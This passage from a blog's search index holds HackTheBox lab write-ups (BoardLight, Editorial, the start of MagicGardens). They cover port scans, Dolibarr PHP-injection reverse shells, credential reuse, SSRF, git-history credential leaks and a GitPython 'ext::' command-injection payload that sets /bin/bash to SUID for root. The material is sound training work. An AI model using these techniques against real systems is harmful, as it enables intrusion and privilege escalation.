06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH0dV4gtJNo8ixEEBDxhUId6Pc/8iNLX16+zpUCIgmxxl5TivDMLg2JvXorp4F2r8ci44CESUlnMHRSYNtlLttiIZHpTML7ktFHbNexvOAJqE1lIlQlGjWBU1hWq6Y6n1tuUANOd5U+Yc0/h53gKu5nXTQTy1c9CLbQfaYvFjnzrR3NQ6Hw7ih5u3mEjJngP+Sq+dpzUcnFe1BekvBPrxdAJwN6w+MSpGFyQSAkUthrOE4JRnpa6jSsTjXODDjioNkp2NLkKa73Yc2DHk3evNUXfa+P8oWFBk8ZXSHFyeOoNkcqkPCrkevB71NdFtn3Fd/Ar07co0ygw90Vb2q34cu1Jo/1oPV1UFsvcwaKJuxBKozH+VA0F9hyriPKjsvTRCbkFjweLxCib5phagHu6K5KEYC+VmWbCUnWyvYZauJ1/t5xQqqi9UWssRjbE1mI0Krq2Zb97qnONhzcclAPVpvEVdCCcl0rYZjQt6VI1PzHha56JepZCFCNvX3FVxYzEk= | 256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK7G5PgPkbp1awVqM5uOpMJ/xVrNirmwIT21bMG/+jihUY8rOXxSbidRfC9KgvSDC4flMsPZUrWziSuBDJAra5g= | 256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILHj/lr3X40pR3k9+uYJk4oSjdULCK0DlOxbiL66ZRWg 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%) No exact OS matches for host (test conditions non-ideal). TCP/IP fingerprint: SCAN(V=7.94SVN%E=4%D=5/26%OT=22%CT=%CU=35758%PV=Y%DS=2%DC=T%G=N%TM=6652CBFE%P=x86_64-pc-linux-gnu) SEQ(SP=107%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A) OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11) WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88) ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=) T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=) T2(R=N) T3(R=N) T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=) T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=) U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G) IE(R=Y%DFI=N%T=40%CD=S) Uptime guess: 29.321 days (since Fri Apr 26 18:00:39 2024) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=263 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 22/tcp) HOP RTT ADDRESS 1 95.49 ms 10.10.14.1 2 91.74 ms 10.10.11.11 This is what the website looks like.\nI checked the newsletter form, contact form, and looked around the website. It doesn‚Äôt seem to work at all, so the injection point is probably not in this asset. We can try subdomain brute forcing and directory brute forcing now.\nI will first conduct directory brute forcing using Gobuster:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ gobuster dir -u http://board.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 90 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://board.htb/ [+] Method: GET [+] Threads: 90 [+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 307] [--\u0026gt; http://board.htb/images/] /css (Status: 301) [Size: 304] [--\u0026gt; http://board.htb/css/] /js (Status: 301) [Size: 303] [--\u0026gt; http://board.htb/js/] /server-status (Status: 403) [Size: 274] Nothing interesting with the directories. We might check the JS and source codes, but they don‚Äôt seem promising at the moment. Before checking the source code, we can try subdomain brute forcing using Gobuster again:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ gobuster vhost -u http://board.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 90 --append-domain --exclude-length 301 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://board.htb/ [+] Method: GET [+] Threads: 90 [+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt [+] User Agent: gobuster/3.6 [+] Timeout: 10s [+] Append Domain: true [+] Exclude Length: 301 =============================================================== Starting gobuster in VHOST enumeration mode =============================================================== Found: crm.board.htb Status: 200 [Size: 6360] Found: CRM.board.htb Status: 200 [Size: 6360] I added the newly found subdomain to my /etc/hosts file to gain access to it.\n1 2 3 4 5 6 7 8 9 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali] ‚îî‚îÄ# cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 kali ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.10.11.11 board.htb crm.board.htb Accessing the web page, we see it‚Äôs Dolibarr 17.0.0. Dolibarr ERP \u0026amp; CRM is modular business management software that adapts to the size of the company (SMEs, large companies, freelancers, or associations).\nAfter doing a few research on this version of Dolibarr, I found a CVE associated with it: https://www.swascan.com/security-advisory-dolibarr-17-0-0/\nUser Flag This CVE allows us to execute Authenticated PHP Code Injection. So we need to be authenticated before we can inject PHP code. Trying the default username and password admin:admin worked perfectly as expected.\nI followed the Proof of Concept (PoC) from the above URL by creating a web page from the ‚ÄúWebsites‚Äù tab, then changing the HTML source to add our PHP reverse shell payload and get a reverse shell.\nThe PHP code is flagged as disabled; however, it‚Äôs still possible to inject PHP code as the Test user by typing \u0026lt;?PHP code‚Ä¶?\u0026gt; instead of \u0026lt;?php code..?\u0026gt;.\nBefore injecting, I have netcat actively listening on port 6969. (nc -nvlp 6969)\nOnce the injected payload is executed and we visit the site, I can see the shell popped up in my netcat session. I will quickly stabilize the shell with a Python TTY shell. With the shell as www-data, I will run LinPEAS to see if we have a vector to laterally move to the user Larissa.\nAfter enumerating on my own without using LinPEAS, I found interesting stuff in /var/www/html/crm.board.htb/htdocs/conf/conf.php.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $dolibarr_main_url_root=\u0026#39;http://crm.board.htb\u0026#39;; $dolibarr_main_document_root=\u0026#39;/var/www/html/crm.board.htb/htdocs\u0026#39;; $dolibarr_main_url_root_alt=\u0026#39;/custom\u0026#39;; $dolibarr_main_document_root_alt=\u0026#39;/var/www/html/crm.board.htb/htdocs/custom\u0026#39;; $dolibarr_main_data_root=\u0026#39;/var/www/html/crm.board.htb/documents\u0026#39;; $dolibarr_main_db_host=\u0026#39;localhost\u0026#39;; $dolibarr_main_db_port=\u0026#39;3306\u0026#39;; $dolibarr_main_db_name=\u0026#39;dolibarr\u0026#39;; $dolibarr_main_db_prefix=\u0026#39;llx_\u0026#39;; $dolibarr_main_db_user=\u0026#39;dolibarrowner\u0026#39;; $dolibarr_main_db_pass=\u0026#39;serverfun2$2023!!\u0026#39;; $dolibarr_main_db_type=\u0026#39;mysqli\u0026#39;; $dolibarr_main_db_character_set=\u0026#39;utf8\u0026#39;; $dolibarr_main_db_collation=\u0026#39;utf8_unicode_ci\u0026#39;; // Authentication settings $dolibarr_main_authentication=\u0026#39;dolibarr\u0026#39;; //$dolibarr_main_demo=\u0026#39;autologin,autopass\u0026#39;; // Security settings $dolibarr_main_prod=\u0026#39;0\u0026#39;; $dolibarr_main_force_https=\u0026#39;0\u0026#39;; $dolibarr_main_restrict_os_commands=\u0026#39;mysqldump, mysql, pg_dump, pgrestore\u0026#39;; $dolibarr_nocsrfcheck=\u0026#39;0\u0026#39;; $dolibarr_main_instance_unique_id=\u0026#39;ef9a8f59524328e3c36894a9ff0562b5\u0026#39;; $dolibarr_mailing_limit_sendbyweb=\u0026#39;0\u0026#39;; $dolibarr_mailing_limit_sendbycli=\u0026#39;0\u0026#39;; Here in this config file, I found the database username and password. I will use the MySQL command like this to log in to the database:\n1 mysql -u dolibarrowner -p (and password as: serverfun2$2023!!)\nI can see the database names with SHOW DATABASES; too, but we already know the database name from the above config. I will select this database using use dolibarr; and try to see the available tables using SHOW TABLES;. I then executed:\n1 SELECT * FROM llx_user; I selected the interesting stuff from MySQL.\n1 2 3 4 5 6 7 8 mysql\u0026gt; select admin, pass_crypted, api_key, firstname, lastname from llx_user; +-------+--------------------------------------------------------------+--------------+-----------+------------+ | admin | pass_crypted | api_key | firstname | lastname | +-------+--------------------------------------------------------------+--------------+-----------+------------+ | 1 | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm | NULL | | SuperAdmin | | 0 | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 | yr6V3pXd9QEI | | admin | +-------+--------------------------------------------------------------+--------------+-----------+------------+ 2 rows in set (0.00 sec) I attempted to crack the first hash, which unfortunately remained uncracked. However, after a bit of frustration, I realized that the user password and the database password are the same. So, I SSHed to the user account with:\n1 ssh larissa@board.htb and used the password (serverfun2$2023!!) obtained from the conf.php file. And there we go, we have the user flag now.\nRoot Flag I quickly transferred LinPEAS to the target machine and ran it to see if there is any privilege escalation vector.\nHowever, what I noticed is that this box had desktop, document, and picture files in the /home/larissa directory, which is not normal for a typical Linux server. This anomaly is likely due to the desktop environment installed on this box. So, I quickly tried to enumerate what desktop environment this box uses. It turns out this box uses version 0.23.1 of the Enlightenment desktop environment.\nAfter conducting some research, I found a working privilege escalation CVE associated with this desktop environment. The Proof of Concept (PoC) of the CVE can be found at: https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit.\nThe Enlightenment Version: 0.25.3 is indeed vulnerable to local privilege escalation. The vulnerability lies in Enlightenment_sys before version 0.25.3, which allows local users to gain privileges because it is setuid root. The issue arises from the mishandling of pathnames that begin with a /dev/.. substring. If an attacker has local access to a machine on which Enlightenment is installed, they can exploit this vulnerability to execute potentially dangerous actions.\nI created an exploit.sh script in the /tmp directory and granted it execute permissions with chmod +x exploit.sh. Then, I executed the bash script downloaded from the GitHub link of the PoC, and, boom, we obtained a root shell.\nConclusion Thanks for following my write-up. Keep learning and happy hacking! üôÇ\n","permalink":"http://localhost:1313/writeups/hackthebox/boardlight/","summary":"BoardLight is an easy Linux machine exploiting Dolibarr CVE-2023-30253 to gain www-data, then SSH access via plaintext creds. Privilege escalation is achieved through a vulnerable SUID Enlightenment binary (CVE-2022-37706) for root access.","title":"BoardLight Writeup - HackTheBox"},{"content":" Link: https://app.hackthebox.com/machines/Editorial Difficulty Easy Machine Linux Enumeration I ran nmap scan quickly on the target machine to reveal open ports on the box.\n1 2 3 PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack I again ran agressive scan on the box on two open ports again using sudo nmap 10.10.11.20 -T4 -vv -sC -sV -A -O , following is result of the scan:\n1 2 3 4 5 6 7 8 9 10 11 12 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM= | 256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx 80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Did not follow redirect to http://editorial.htb |_http-server-header: nginx/1.18.0 (Ubuntu) I added editorial.htb to my /etc/hosts file using command ‚Äúecho '10.10.11.20 editorial.htb' \u0026gt;\u0026gt; /etc/hosts‚Äù and then visited http://editorial.htb the site looks like this:\nUser Flag There is /upload endpoint where we have upload functionality. We might get File Upload to RCE on this box. I will try to upload a reverse shell script to get a shell.\nAfter bit of testing, the form field has cover url section which is actually vulnerable to SSRF and not file upload vulnerability in this website.\nThe following request is vulnerable to SSRF where I will try to\nUpon testing on internal network, I found that there is port 5000 open on this box.\nVisiting the port 5000 response i.e (static/uploads/rrrrrrrr-eeee-zzzz-yyyyy-iscool) reveals the api endpoint:\nI visited the api endpoint and tried to open the file downloaded from the request recieved from the rsponse.\nUpon visiting the endpoint given as by the request from above image, we get a file downloaded in our system.\nThe file contains the username and password for user dev. Using SSH to the user and now we get user flag.\nRoot Flag There is a directory /apps which contains .git in home directory of the user dev.\n1 2 3 4 5 6 7 8 9 10 11 dev@editorial:~$ ls apps lol.zip user.txt dev@editorial:~$ cd apps dev@editorial:~/apps$ ls -la total 24 drwxrwxr-x 6 dev dev 4096 Jun 16 08:17 . drwxr-x--- 5 dev dev 4096 Jun 16 08:17 .. drwxrwxr-x 2 dev dev 4096 Jun 16 08:13 app_api drwxrwxr-x 4 dev dev 4096 Jun 16 08:10 app_editorial drwxr-xr-x 8 dev dev 4096 Jun 16 08:09 .git drwxrwxr-x 2 dev dev 4096 Mar 9 2021 GitDump-master I will try to see logs:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 dev@editorial:~/apps$ git log . commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -\u0026gt; master) Author: dev-carlos.valderrama \u0026lt;dev-carlos.valderrama@tiempoarriba.htb\u0026gt; Date: Sun Apr 30 21:04:21 2023 -0500 fix: bugfix in api port endpoint commit dfef9f20e57d730b7d71967582035925d57ad883 Author: dev-carlos.valderrama \u0026lt;dev-carlos.valderrama@tiempoarriba.htb\u0026gt; Date: Sun Apr 30 21:01:11 2023 -0500 change: remove debug and update api port commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae Author: dev-carlos.valderrama \u0026lt;dev-carlos.valderrama@tiempoarriba.htb\u0026gt; Date: Sun Apr 30 20:55:08 2023 -0500 change(api): downgrading prod to dev * To use development environment. commit 1e84a036b2f33c59e2390730699a488c65643d28 Author: dev-carlos.valderrama \u0026lt;dev-carlos.valderrama@tiempoarriba.htb\u0026gt; Date: Sun Apr 30 20:51:10 2023 -0500 feat: create api to editorial info * It (will) contains internal info about the editorial, this enable faster access to information. commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 Author: dev-carlos.valderrama \u0026lt;dev-carlos.valderrama@tiempoarriba.htb\u0026gt; Date: Sun Apr 30 20:48:43 2023 -0500 feat: create editorial app Thee commit¬†b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae¬†shows that there is change in api downgrading from¬†prod¬†to¬†dev. I will try to show the commit like this:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae Author: dev-carlos.valderrama \u0026lt;dev-carlos.valderrama@tiempoarriba.htb\u0026gt; Date: Sun Apr 30 20:55:08 2023 -0500 change(api): downgrading prod to dev * To use development environment. diff --git a/app_api/app.py b/app_api/app.py index 61b786f..3373b14 100644 --- a/app_api/app.py +++ b/app_api/app.py @@ -64,7 +64,7 @@ def index(): @app.route(api_route + \u0026#39;/authors/message\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def api_mail_new_authors(): return jsonify({ - \u0026#39;template_mail_message\u0026#39;: \u0026#34;Welcome to the team! We are thrilled to have you on board and can\u0026#39;t wait to see the incredible content you\u0026#39;ll bring to the table.\\n\\nYour login credentials for our internal forum and authors site are:\\nUsername: prod\\nPassword: R3DACTED_PASSWORD\\nPlease be sure to change your password as soon as possible for security purposes.\\n\\nDon\u0026#39;t hesitate to reach out if you have any questions or ideas - we\u0026#39;re always here to support you.\\n\\nBest regards, \u0026#34; + api_editorial_name + \u0026#34; Team.\u0026#34; + \u0026#39;template_mail_message\u0026#39;: \u0026#34;Welcome to the team! We are thrilled to have you on board and can\u0026#39;t wait to see the incredible content you\u0026#39;ll bring to the table.\\n\\nYour login credentials for our internal forum and authors site are:\\nUsername: dev\\nPassword: R3DACTEDPASSWORD!@\\nPlease be sure to change your password as soon as possible for security purposes.\\n\\nDon\u0026#39;t hesitate to reach out if you have any questions or ideas - we\u0026#39;re always here to support you.\\n\\nBest regards, \u0026#34; + api_editorial_name + \u0026#34; Team.\u0026#34; }) # TODO: replace dev credentials when checks pass # ------------------------------- This has credential for both user prod and dev. Since we are already at user prod, we will change our user to prod.\n1 2 3 dev@editorial:~/apps$ su prod Password: prod@editorial:/home/dev/apps$ By using sudo -l i can see that this user prod can use /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py * as root and we wont be asked for password.\nBelow is the code for the python script /opt/internal_apps/clone_changes/clone_prod_change.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 prod@editorial:/home/dev/apps$ cat /opt/internal_apps/clone_changes/clone_prod_change.py #!/usr/bin/python3 import os import sys from git import Repo os.chdir(\u0026#39;/opt/internal_apps/clone_changes\u0026#39;) url_to_clone = sys.argv[1] r = Repo.init(\u0026#39;\u0026#39;, bare=True) r.clone_from(url_to_clone, \u0026#39;new_changes\u0026#39;, multi_options=[\u0026#34;-c protocol.ext.allow=always\u0026#34;]) This script changes the working directory to /opt/internal_apps/clone_changes, initializes a bare Git repository, and clones the repository specified by url_to_clone into a subdirectory named new_changes with a specific Git configuration option.\nDoing few research there is RCE vulnerability for this. If you are interested reading you can read here.\nI will use this script to make /bin/bash suid binary and then use it to get root shell.\nI ran sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% u+s% /bin/bash'\nAlthough I got errors, it successfully made it suid binary. I simply then ran /bin/bash -p to get root shell.\n1 2 3 prod@editorial:~$ /bin/bash -p bash-5.1# id uid=1000(prod) gid=1000(prod) euid=0(root) groups=1000(prod) There we go. We rooted this box successfully.\nConclusion Thanks for following my writeup. Follow my blogs for more. :D\n","permalink":"http://localhost:1313/writeups/hackthebox/editorial/","summary":"Editorial is an easy Linux machine using an SSRF vulnerability to access an internal API and retrieve SSH credentials. Further Git enumeration reveals more creds, with root access gained via CVE-2022-24439 and misconfigured sudo permissions.","title":"Editorial Writeup - HackTheBox"},{"content":" Link: https://app.hackthebox.com/machines/MagicGardens Difficulty Insane Machine Linux Enumeration As usual, initiating an Nmap scan on this machine with the command nmap 10.10.11.9 -T4 -vv -p- yields the following output:\n1 2 3 4 5 6 PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 25/tcp open smtp syn-ack 80/tcp open http syn-ack 1337/tcp open waste syn-ack 5000/tcp open upnp syn-ack I also conducted an aggressive scan on the ports, and here is the output for that:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) | ssh-hostkey: | 256 e0:72:62:48:99:33:4f:fc:59:f8:6c:05:59:db:a7:7b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE+EeX4lxNTcWYvgDh0dFVJlf0h9G0LwupXad6GDD9ct6lKEgELk3y0YuoNg/tOzn8t3TvhMsfAK2zB8dKfenM4= | 256 62:c6:35:7e:82:3e:b1:0f:9b:6f:5b:ea:fe:c5:85:9a (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIYE2YyLpUp0IAWy3y5WUxFUEuF51LNMOevqPNzYKudU 25/tcp open smtp syn-ack ttl 63 Postfix smtpd |_smtp-commands: magicgardens.magicgardens.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING 80/tcp open http syn-ack ttl 63 nginx 1.22.1 |_http-server-header: nginx/1.22.1 | http-methods: |_ Supported Methods: GET HEAD OPTIONS |_http-title: Magic Gardens |_http-favicon: Unknown favicon MD5: 2D4E563DC4B95F3EDDD2DA91D4ED426A 1337/tcp open waste? syn-ack ttl 63 | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, TerminalServer, TerminalServerCookie, X11Probe, afp, giop, ms-sql-s: |_ [x] Handshake error 5000/tcp open ssl/http syn-ack ttl 62 Docker Registry (API: 2.0) | ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU | Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU | Public Key type: rsa | Public Key bits: 4096 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2023-05-23T11:57:43 | Not valid after: 2024-05-22T11:57:43 | MD5: 2f97:8372:17ae:abe4:a4d9:5937:f438:3e71 | SHA-1: a6f9:ce07:c808:150a:00aa:f193:1b72:a963:f414:f57c | -----BEGIN CERTIFICATE----- | MIIFazCCA1OgAwIBAgIUDWhFdCp8MnPK7iV0Eqp2Tn4y5OQwDQYJKoZIhvcNAQEL | BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM | GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yMzA1MjMxMTU3NDNaFw0yNDA1 | MjIxMTU3NDNaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw | HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggIiMA0GCSqGSIb3DQEB | AQUAA4ICDwAwggIKAoICAQDch9kz4icrrlZKg4blZD2CfpvP6Gj3SdJgywfEiJNu | LX0Vxj1nxCNwcGuHsVXDIcHNfVjd8rS/zHrtUF70ONjXfWRPQo7jhEEV4+zTtXjz | X4aoesPoYCD3fc7TSbLjWCJELKdtrdOxST0QMPkeQQYf37FARHvnGNAAKHEwL9mO | EtvgRUvxKrUcKAB9XdAORZjzfSe67bedF47n7+CFx4imizS74dmXx99Kwgvb4JO3 | LrKlQR/K7lsqNAbykuPMxKrO2l1sVNMtxo5/BLkG2aTBMI12Mbr+dJ2C4LKGsSzj | 2Z9vJR9EoOJCv5BzYmB2iCBe/6itnxFj+f1YJUDMA1j191O4gI9pp3K5hm9u5Avk | kDhOgqfsaD02X/KFClnRnL3nY5GQAUw4HqLc3qgdf4DorD7hecEUehLhvYMDCBlq | 0wdpwsOQCpQdJwg8fE+pyAciCpNc6tX73x5juhkyRaPg7okwMB9y0d1aN7601yCy | TX0ITmMLP8WJUvRLTrmQWDDmg434gwc/GH8RoLyR12+B7731X07EXaA6nyNleMvg | BV6X++MgItCuAQv4yVgfXJ49DL3n2SH66COElyr+L/m64gbuhsGjxNLIgELLKUkO | 3lJbHTpqDzBGGo/C1/vYZE2gj7/JZPeDWm0otm1T3trKIHkGuSDqVcbe6Rm8xtGb | 9QIDAQABo1MwUTAdBgNVHQ4EFgQUK9LKRtUE2IAKDDfGCrqB/hG1irMwHwYDVR0j | BBgwFoAUK9LKRtUE2IAKDDfGCrqB/hG1irMwDwYDVR0TAQH/BAUwAwEB/zANBgkq | hkiG9w0BAQsFAAOCAgEAM8+ImqdW9fT9jVE0XTGi0PmYM7bwXKWlJQU1NhzisuI2 | 7IzLsTH1HhysrMmksJu4/EdCMZdZFCpvPcZZqRzltJl0BW0Fcbl6YT12JCosbIRG | GhhNKt/Pi/1/Gbx0e3WjzNHMN/3RN4ARFx5MxL6yImJDq7+Xr2FJNvUeQ4HyUEH0 | Qvz5PFhArLyUz3/NFqV4LxxyjxoLWyd8WXwFo71aq1GWLu9R/2RL+WPhN946TYlh | p/iJV3SeemHIgRdWDGkXxRe6itp2zA/nkggxxy5TexbPY2z7VwAMqIizIKAEScFm | t/cj12LxRswz2xicoNcC/nhoIxpZWh3qLfPh1W3gqMgAZvtPLDVQQvhNiJhJ2jPu | D6SozctK1yA9uGkEFUEhOiNZ2X2vENiqJGggQsDQKDSrGS2sqZvKXoyNqcHQsUBI | m5EZ6PQRgr4JMk2/JTqjpl2yN+EV7kfqrj5m6oiXmBOdg4osLse+7zLWUWSLwlic | jrwMmoQsRbgKCA5+pB+CnKBVZjxKPw3qneqK3Gp2qVNf/yVKK0fFUhCYgRiqxfAz | PhySBYrxEfqIqoMxCWIcnvvyil8rLJd4QEVAok5zZVIEohhlDhLZ60wnx2wNygA+ | s/nOcZJ2ylq6Lz7syIeAzG9YeLkFOuRtQXj8CuwhLcDPliLrrjJiwYmMYBpb7Z0= |_-----END CERTIFICATE----- | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Site doesn\u0026#39;t have a title. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port1337-TCP:V=7.94SVN%I=7%D=5/21%Time=664C4533%P=x86_64-pc-linux-gnu%r SF:(GenericLines,15,\u0026#34;\\[x\\]\\x20Handshake\\x20error\\n\\0\u0026#34;)%r(GetRequest,15,\u0026#34;\\[ SF:x\\]\\x20Handshake\\x20error\\n\\0\u0026#34;)%r(HTTPOptions,15,\u0026#34;\\[x\\]\\x20Handshake\\x2 SF:0error\\n\\0\u0026#34;)%r(RTSPRequest,15,\u0026#34;\\[x\\]\\x20Handshake\\x20error\\n\\0\u0026#34;)%r(RPCC SF:heck,15,\u0026#34;\\[x\\]\\x20Handshake\\x20error\\n\\0\u0026#34;)%r(DNSVersionBindReqTCP,15,\u0026#34;\\ SF:[x\\]\\x20Handshake\\x20error\\n\\0\u0026#34;)%r(DNSStatusRequestTCP,15,\u0026#34;\\[x\\]\\x20Han SF:dshake\\x20error\\n\\0\u0026#34;)%r(Help,15,\u0026#34;\\[x\\]\\x20Handshake\\x20error\\n\\0\u0026#34;)%r(Te SF:rminalServerCookie,15,\u0026#34;\\[x\\]\\x20Handshake\\x20error\\n\\0\u0026#34;)%r(X11Probe,15, SF:\u0026#34;\\[x\\]\\x20Handshake\\x20error\\n\\0\u0026#34;)%r(FourOhFourRequest,15,\u0026#34;\\[x\\]\\x20Han SF:dshake\\x20error\\n\\0\u0026#34;)%r(LPDString,15,\u0026#34;\\[x\\]\\x20Handshake\\x20error\\n\\0\u0026#34;) SF:%r(LDAPSearchReq,15,\u0026#34;\\[x\\]\\x20Handshake\\x20error\\n\\0\u0026#34;)%r(LDAPBindReq,15 SF:,\u0026#34;\\[x\\]\\x20Handshake\\x20error\\n\\0\u0026#34;)%r(LANDesk-RC,15,\u0026#34;\\[x\\]\\x20Handshake SF:\\x20error\\n\\0\u0026#34;)%r(TerminalServer,15,\u0026#34;\\[x\\]\\x20Handshake\\x20error\\n\\0\u0026#34;)% SF:r(NCP,15,\u0026#34;\\[x\\]\\x20Handshake\\x20error\\n\\0\u0026#34;)%r(NotesRPC,15,\u0026#34;\\[x\\]\\x20Han 